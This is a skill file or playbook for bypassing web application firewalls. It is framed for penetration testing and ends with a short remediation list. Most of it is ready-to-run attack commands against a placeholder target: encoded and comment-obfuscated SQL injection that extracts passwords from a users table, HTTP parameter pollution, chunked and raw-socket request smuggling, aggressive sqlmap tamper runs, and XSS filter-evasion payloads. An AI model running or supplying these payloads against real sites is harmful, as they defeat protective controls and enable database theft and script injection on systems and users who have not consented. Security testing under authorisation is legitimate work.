---
name: performing-web-application-firewall-bypass
description: Bypass Web Application Firewall protections using encoding techniques, HTTP method manipulation, parameter pollution, and payload obfuscation to deliver SQL injection, XSS, and other attack payloads past WAF detection rules.
domain: cybersecurity
subdomain: web-application-security
tags: [waf-bypass, waf-evasion, sql-injection, xss, payload-obfuscation, encoding-bypass, web-security]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing Web Application Firewall Bypass

## When to Use
- When confirmed vulnerabilities are blocked by WAF signature-based detection
- During penetration testing where WAF prevents exploitation of known issues
- When evaluating WAF rule effectiveness against evasion techniques
- During red team engagements requiring bypass of perimeter security controls
- When testing custom WAF rules for completeness and bypass resistance

## Prerequisites
- Burp Suite Professional with SQLMap integration
- wafw00f for WAF fingerprinting and identification
- SQLMap with tamper scripts for automated WAF bypass
- Understanding of WAF detection mechanisms (signature, regex, behavioral)
- Collection of encoding and obfuscation techniques per attack type
- Knowledge of HTTP protocol nuances exploitable for evasion

## Workflow

### Step 1 — Identify and Fingerprint the WAF
```bash
# Detect WAF using wafw00f
wafw00f http://target.com

# Manual WAF detection via response headers
curl -sI http://target.com | grep -iE "x-cdn|server|x-powered-by|x-sucuri|cf-ray|x-akamai"

# Trigger WAF with known bad payload and analyze response
curl "http://target.com/page?id=1' OR 1=1--" -v
# Look for: 403 Forbidden, custom block page, CAPTCHA challenge

# Common WAF indicators:
# Cloudflare: cf-ray header, __cfduid cookie
# AWS WAF: x-amzn-requestid
# ModSecurity: Mod_Security or OWASP CRS error messages
# Akamai: AkamaiGHost header
# Imperva: incap_ses cookie, visid_incap cookie
```

### Step 2 — Bypass with Encoding and Obfuscation
```bash
# URL encoding bypass
curl "http://target.com/page?id=1%27%20OR%201%3D1--"

# Double URL encoding
curl "http://target.com/page?id=1%2527%2520OR%25201%253D1--"

# Unicode encoding
curl "http://target.com/page?id=1%u0027%u0020OR%u00201%u003D1--"

# HTML entity encoding in body
curl -X POST http://target.com/search \
  -d "q=<script>alert&#40;1&#41;</script>"

# Mixed case SQL keywords
curl "http://target.com/page?id=1' UnIoN SeLeCt password FrOm users--"

# Inline comments between SQL keywords
curl "http://target.com/page?id=1'/*!UNION*//*!SELECT*/password/*!FROM*/users--"

# MySQL version-specific comments
curl "http://target.com/page?id=1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--"

# Null bytes
curl "http://target.com/page?id=1'%00 OR 1=1--"

# Tab and newline substitution for spaces
curl "http://target.com/page?id=1'%09UNION%0ASELECT%0D1,2,3--"
```

### Step 3 — Bypass with HTTP Method and Protocol Tricks
```bash
# Change HTTP method (WAFs may only inspect GET/POST)
curl -X PUT "http://target.com/page?id=1' OR 1=1--"
curl -X PATCH "http://target.com/page" -d "id=1' OR 1=1--"

# Use HTTP/0.9 (no headers)
printf "GET /page?id=1' OR 1=1-- \r\n" | nc target.com 80

# Content-Type manipulation
curl -X POST http://target.com/page \
  -H "Content-Type: application/x-www-form-urlencoded; charset=ibm037" \
  -d "id=1' OR 1=1--"

# Multipart form data (may bypass body inspection)
curl -X POST http://target.com/page \
  -F "id=1' OR 1=1--"

# Chunked Transfer-Encoding
printf "POST /page HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nid=1\r\n11\r\n' OR 1=1--\r\n0\r\n\r\n" | nc target.com 80

# Parameter in unusual locations
curl http://target.com/page -H "X-Forwarded-For: 1' OR 1=1--"
curl http://target.com/page -H "Referer: http://target.com/page?id=1' OR 1=1--"
```

### Step 4 — Bypass with Payload Splitting and HPP
```bash
# HTTP Parameter Pollution
curl "http://target.com/page?id=1' UNION&id=SELECT password FROM users--"

# Split payload across parameters
curl "http://target.com/page?id=1'/*&q=*/UNION SELECT 1,2,3--"

# JSON-based SQLi (many WAFs miss JSON payloads)
curl -X POST http://target.com/api/query \
  -H "Content-Type: application/json" \
  -d '{"id": "1 AND 1=1 UNION SELECT password FROM users"}'

# JSON SQL injection with operators
curl -X POST http://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"query": {"$gt":"", "$where":"1==1"}}'

# XML-wrapped payloads
curl -X POST http://target.com/api/data \
  -H "Content-Type: application/xml" \
  -d "<data><id>1' UNION SELECT password FROM users--</id></data>"
```

### Step 5 — Use SQLMap Tamper Scripts
```bash
# SQLMap with built-in tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=between,randomcase,space2comment

# Common tamper scripts for WAF bypass:
sqlmap -u "http://target.com/page?id=1" --tamper=charunicodeencode
sqlmap -u "http://target.com/page?id=1" --tamper=space2mssqlhash
sqlmap -u "http://target.com/page?id=1" --tamper=percentage
sqlmap -u "http://target.com/page?id=1" --tamper=chardoubleencode,between

# Multiple tamper scripts combined
sqlmap -u "http://target.com/page?id=1" \
  --tamper=randomcase,space2comment,between,charunicodeencode \
  --random-agent --level 5 --risk 3

# Custom WAF bypass profile
sqlmap -u "http://target.com/page?id=1" \
  --tamper=space2comment,randomcase \
  --delay=2 --random-agent \
  --technique=B --batch
```

### Step 6 — XSS WAF Bypass Techniques
```bash
# Case variation
curl "http://target.com/page?q=<ScRiPt>alert(1)</ScRiPt>"

# Event handler alternatives
curl "http://target.com/page?q=<img src=x oNerRor=alert(1)>"
curl "http://target.com/page?q=<svg/onload=alert(1)>"
curl "http://target.com/page?q=<body onpageshow=alert(1)>"
curl "http://target.com/page?q=<marquee onstart=alert(1)>"

# JavaScript URI scheme
curl "http://target.com/page?q=<a href=javascript:alert(1)>click</a>"

# Template literal syntax
curl "http://target.com/page?q=<script>alert\x601\x60</script>"

# Concatenation-based bypass
curl "http://target.com/page?q=<script>al\u0065rt(1)</script>"

# HTML encoding within attributes
curl "http://target.com/page?q=<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"

# Double encoding
curl "http://target.com/page?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| Signature Evasion | Obfuscating payloads to avoid matching WAF regex patterns |
| Encoding Bypass | Using URL, Unicode, or HTML encoding to disguise malicious characters |
| Protocol-Level Bypass | Exploiting HTTP protocol features (chunked encoding, method override) |
| Tamper Scripts | SQLMap modules that transform payloads to evade specific WAF rules |
| Content-Type Confusion | Sending payloads in unexpected content types the WAF does not inspect |
| Parameter Pollution | Splitting payloads across duplicate parameters to evade per-parameter inspection |
| Behavioral vs Signature | WAF detection modes: pattern matching (bypassable) vs. anomaly detection (harder) |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| wafw00f | WAF fingerprinting and identification |
| SQLMap | Automated SQL injection with WAF bypass tamper scripts |
| waf-bypass.com | Community-maintained WAF bypass payload database |
| Awesome-WAF | Curated GitHub repository of WAF bypass techniques |
| Burp Suite | HTTP proxy for manual payload crafting and WAF response analysis |
| XSStrike | XSS scanner with WAF detection and bypass capabilities |

## Common Scenarios

1. **SQLi Through JSON** — Bypass WAF by sending SQL injection payloads inside JSON request bodies that are not inspected by the WAF rules
2. **XSS via Event Handlers** — Use alternative HTML event handlers (onpageshow, onanimationstart) not covered by WAF signature rules
3. **Encoding Chain Bypass** — Apply multiple layers of encoding (URL + Unicode + HTML entity) to evade each decoding layer of the WAF
4. **Chunked Transfer Bypass** — Split malicious payload across HTTP chunked transfer encoding segments to avoid pattern matching
5. **Method Override** — Send attack payloads via PUT/PATCH methods or custom headers that WAF does not inspect

## Output Format

```
## WAF Bypass Assessment Report
- **Target**: http://target.com
- **WAF Identified**: Cloudflare (via cf-ray header)
- **Bypass Achieved**: Yes

### WAF Detection Results
| Payload Type | Blocked | Bypass Found |
|-------------|---------|-------------|
| Basic SQLi | Yes | Yes (JSON encoding) |
| UNION SELECT | Yes | Yes (inline comments) |
| XSS <script> | Yes | Yes (SVG onload) |
| Path Traversal | No | N/A (not blocked) |

### Successful Bypass Payloads
| # | Original (Blocked) | Bypass Payload | Technique |
|---|-------------------|---------------|-----------|
| 1 | 1' OR 1=1-- | {"id":"1' OR 1=1--"} | JSON content-type |
| 2 | UNION SELECT | /*!50000UNION*/ /*!50000SELECT*/ | MySQL version comments |
| 3 | <script>alert(1)</script> | <svg/onload=alert(1)> | Alternative tag+event |

### Remediation
- Enable JSON body inspection in WAF rules
- Implement behavioral analysis alongside signature detection
- Add rules for uncommon HTML tags and event handlers
- Enable deep content inspection for all HTTP methods
- Implement request normalization before rule evaluation
```
